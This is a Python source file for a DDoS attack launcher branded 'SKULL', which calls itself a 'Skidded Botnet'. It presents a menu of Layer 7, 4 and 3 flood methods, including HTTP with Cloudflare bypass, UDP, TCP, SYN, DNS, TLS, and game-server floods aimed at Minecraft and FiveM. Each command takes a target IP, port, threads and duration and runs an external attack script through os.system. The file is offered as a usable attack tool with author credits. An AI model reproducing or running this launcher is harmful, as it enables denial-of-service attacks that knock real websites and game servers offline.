import os
import colorama
from colorama import Fore

os.system('cls' if os.name == 'nt' else 'clear')

colorama.init(autoreset=True)
while True:
    main_banner = f"""
{Fore.RED}███████╗██╗  ██╗██╗   ██╗██╗     ██╗     {Fore.WHITE}
{Fore.RED}██╔════╝██║ ██╔╝██║   ██║██║     ██║     {Fore.WHITE}
{Fore.RED}███████╗█████╔╝ ██║   ██║██║     ██║     {Fore.WHITE}
{Fore.RED}╚════██║██╔═██╗ ██║   ██║██║     ██║     {Fore.WHITE}
{Fore.RED}███████║██║  ██╗╚██████╔╝███████╗███████╗{Fore.WHITE}
{Fore.RED}╚══════╝╚═╝  ╚═╝ ╚═════╝ ╚══════╝╚══════╝{Fore.WHITE}
{Fore.WHITE}Upcoming Best {Fore.GREEN}Skidded{Fore.BLUE} Botnet!{Fore.WHITE}
{Fore.WHITE}Type "{Fore.RED}HELP{Fore.WHITE}" To Get Started!{Fore.WHITE}
"""
    print(main_banner)
    main_input = input("</#skull$\> ")

    if main_input == "help":
        os.system('cls' if os.name == 'nt' else 'clear')
        print(main_banner)
        print(f"""

    {Fore.RED}Help   {Fore.WHITE}: Shows The {Fore.RED}Help {Fore.WHITE}Screen{Fore.WHITE}
    {Fore.RED}Methods{Fore.WHITE}: Shows The {Fore.RED}Methods {Fore.WHITE}Screen{Fore.WHITE}
    {Fore.RED}Clear  {Fore.WHITE}: Clears The Screen{Fore.WHITE}
    {Fore.RED}Exit   {Fore.WHITE}: Exits{Fore.WHITE}

    """)
        input("Press Enter To Go Back...")
        os.system('cls' if os.name == 'nt' else 'clear')

    elif main_input == "clear":
        os.system('cls' if os.name == 'nt' else 'clear')
        print(main_banner)
        main_input = input("</#skull$\> ")

    elif main_input == "methods":
        print(f"""
              
Layer {Fore.RED}7{Fore.WHITE}:

HTTP:   <{Fore.RED}IP{Fore.WHITE}> <{Fore.RED}THREADS{Fore.WHITE}> <{Fore.RED}TIME{Fore.WHITE}> <{Fore.RED}CF{Fore.WHITE} OR {Fore.RED}HTTP2{Fore.WHITE}>
HTTTPS: <{Fore.RED}IP{Fore.WHITE}> <{Fore.RED}THREADS{Fore.WHITE}> <{Fore.RED}TIME{Fore.WHITE}>

Layer {Fore.RED}4{Fore.WHITE}:

WIFI:       <{Fore.RED}IP{Fore.WHITE}> <{Fore.RED}PORT{Fore.WHITE}> <{Fore.RED}PACKETS{Fore.WHITE}> <{Fore.RED}TIME{Fore.WHITE}>
UDP6:       <{Fore.RED}IP{Fore.WHITE}> <{Fore.RED}PORT{Fore.WHITE}> <{Fore.RED}PACKETS{Fore.WHITE}> <{Fore.RED}TIME{Fore.WHITE}>
LDOS:       <{Fore.RED}IP{Fore.WHITE}> <{Fore.RED}PORT{Fore.WHITE}> <{Fore.RED}THREADS{Fore.WHITE}> <{Fore.RED}TIME{Fore.WHITE}>
UDP:        <{Fore.RED}IP{Fore.WHITE}> <{Fore.RED}PORT{Fore.WHITE}> <{Fore.RED}SIZE{Fore.WHITE}> <{Fore.RED}TIME{Fore.WHITE}>
MINECRAFT:  <{Fore.RED}IP{Fore.WHITE}> <{Fore.RED}PORT{Fore.WHITE}> <{Fore.RED}SIZE{Fore.WHITE}> <{Fore.RED}TIME{Fore.WHITE}>
FIVEM:      <{Fore.RED}IP{Fore.WHITE}> <{Fore.RED}PORT{Fore.WHITE}> <{Fore.RED}SIZE{Fore.WHITE}> <{Fore.RED}TIME{Fore.WHITE}>
TCP:        <{Fore.RED}IP{Fore.WHITE}> <{Fore.RED}PORT{Fore.WHITE}> <{Fore.RED}SIZE{Fore.WHITE}> <{Fore.RED}TIME{Fore.WHITE}>
DNS:        <{Fore.RED}PORT{Fore.WHITE}> <{Fore.RED}SIZE{Fore.WHITE}> <{Fore.RED}TIME{Fore.WHITE}>
TLS:        <{Fore.RED}HOST{Fore.WHITE}> <{Fore.RED}PORT{Fore.WHITE}> <{Fore.RED}TIME{Fore.WHITE}>
SYN:        <{Fore.RED}IP{Fore.WHITE}>   <{Fore.RED}PORT{Fore.WHITE}> <{Fore.RED}TIME{Fore.WHITE}>
SYN6:       <{Fore.RED}IP{Fore.WHITE}>   <{Fore.RED}PORT{Fore.WHITE}> <{Fore.RED}TIME{Fore.WHITE}>
MSG:        <{Fore.RED}TCP {Fore.WHITE}OR {Fore.RED}UDP{Fore.WHITE}> <{Fore.RED}IP{Fore.WHITE}> <{Fore.RED}PORT{Fore.WHITE}> <{Fore.RED}MESSAGE{Fore.WHITE}>

Layer {Fore.RED}3{Fore.WHITE}:

ICMP-RAW:  <{Fore.RED}IP{Fore.WHITE}> <{Fore.RED}PACKETS{Fore.WHITE}>
              
""")
        input("Press Enter To Go Back...")
        os.system('cls' if os.name == 'nt' else 'clear')

    elif main_input == "exit":
        print("Good Bye Skid!")
        break

    elif main_input == "http":
        ip_http = input("Enter IP: ")
        threads_http = input("Enter Threads: ")
        time_http = input("Enter Time: ")
        method_http = input("Method: ")
        os.system('cls' if os.name == 'nt' else 'clear')
        os.system(f"node Methods/Layer7/http.js {ip_http} {threads_http} {time_http} {method_http}")

    elif main_input == "https":
        ip_http = input("Enter IP: ")
        threads_http = input("Enter Threads: ")
        time_http = input("Enter Time: ")
        os.system('cls' if os.name == 'nt' else 'clear')
        os.system(f"node Methods/Layer7/https.js {ip_http} {threads_http} {time_http}")

    elif main_input == "ldos":
        ip_http = input("Enter IP: ")
        port_http = input("Enter Port: ")
        threads_http = input("Enter Threads: ")
        time_http = input("Enter Time: ")
        os.system('cls' if os.name == 'nt' else 'clear')
        os.system(f"node Methods/Layer4/ldos.js {ip_http} {port_http} {threads_http} {time_http}")

    elif main_input == "udp":
        ip_http = input("Enter IP: ")
        port_http = input("Enter Port: ")
        size_http = input("Enter Threads: ")
        time_http = input("Enter Time: ")
        os.system('cls' if os.name == 'nt' else 'clear')
        os.system(f"node Methods/Layer4/udpnuke.js {ip_http} {port_http} {size_http} {time_http}")

    elif main_input == "minecraft":
        ip_http = input("Enter IP: ")
        port_http = input("Enter Port: ")
        size_http = input("Enter Threads: ")
        time_http = input("Enter Time: ")
        os.system('cls' if os.name == 'nt' else 'clear')
        os.system(f"node Methods/Layer4/minecraft.js {ip_http} {port_http} {size_http} {time_http}")

    elif main_input == "fivem":
        ip_http = input("Enter IP: ")
        port_http = input("Enter Port: ")
        size_http = input("Enter Threads: ")
        time_http = input("Enter Time: ")
        os.system('cls' if os.name == 'nt' else 'clear')
        os.system(f"node Methods/Layer4/fivem.js {ip_http} {port_http} {size_http} {time_http}")

    elif main_input == "tcp":
        ip_http = input("Enter IP: ")
        port_http = input("Enter Port: ")
        size_http = input("Enter Threads: ")
        time_http = input("Enter Time: ")
        os.system('cls' if os.name == 'nt' else 'clear')
        os.system(f"node Methods/Layer4/tcpflood.js {ip_http} {port_http} {size_http} {time_http}")

    elif main_input == "dns":
        port_http = input("Enter Port: ")
        size_http = input("Enter Size: ")
        time_http = input("Enter Time: ")
        os.system('cls' if os.name == 'nt' else 'clear')
        os.system(f"node Methods/Layer4/dns.js {port_http} {size_http} {time_http}")

    elif main_input == "tls":
        host_http = input("Enter Host: ")
        port_http = input("Enter port: ")
        time_http = input("Enter Time: ")
        os.system('cls' if os.name == 'nt' else 'clear')
        os.system(f"node Methods/Layer4/tls.js {host_http} {port_http} {time_http}")

    elif main_input == "syn":
        ip_http = input("Enter IP: ")
        port_http = input("Enter port: ")
        time_http = input("Enter Time: ")
        os.system('cls' if os.name == 'nt' else 'clear')
        os.system(f"node Methods/Layer4/syn.js {ip_http} {port_http} {time_http}")

    elif main_input == "msg":
        method_http = input("Enter Method: ")
        ip_http = input("Enter IP: ")
        port_http = input("Enter port: ")
        msg_http = input("Enter Message: ")
        os.system('cls' if os.name == 'nt' else 'clear')
        os.system(f"node Methods/Layer4/msg.js {method_http} {ip_http} {port_http} {msg_http}")

    elif main_input == "udp6":
        ip_http = input("Enter IP: ")
        port_http = input("Enter port: ")
        packets_http = input("Enter Packets: ")
        time_http = input("Enter Time: ")
        os.system('cls' if os.name == 'nt' else 'clear')
        os.system(f"node Methods/Layer4/udp6.js {ip_http} {port_http} {packets_http} {time_http}")

    elif main_input == "wifi":
        ip_http = input("Enter IP: ")
        port_http = input("Enter port: ")
        packets_http = input("Enter Packets: ")
        time_http = input("Enter Time: ")
        os.system('cls' if os.name == 'nt' else 'clear')
        os.system(f"node Methods/Layer4/wifi.js {ip_http} {port_http} {packets_http} {time_http}")

    elif main_input == "syn6":
        ip_http = input("Enter IP: ")
        port_http = input("Enter port: ")
        time_http = input("Enter Time: ")
        os.system('cls' if os.name == 'nt' else 'clear')
        os.system(f"node Methods/Layer4/syn6.js {ip_http} {port_http} {time_http}")

    elif main_input == "icmp-raw":
        ip_http = input("Enter IP: ")
        packets_http = input("Enter packets: ")
        os.system('cls' if os.name == 'nt' else 'clear')
        os.system(f"python Methods/Layer3/icmp.py {ip_http} {packets_http}")

    else:
        print(f"{Fore.RED}Invalid Command...")
        input("Press Enter To Go Back...")
        os.system('cls' if os.name == 'nt' else 'clear')

# Created By Z3RO
# Discord: @313top 
# Github: https://www.github.com/ohioguy123
# Youtube: https://www.youtube.com/@Z3RO_HUNTS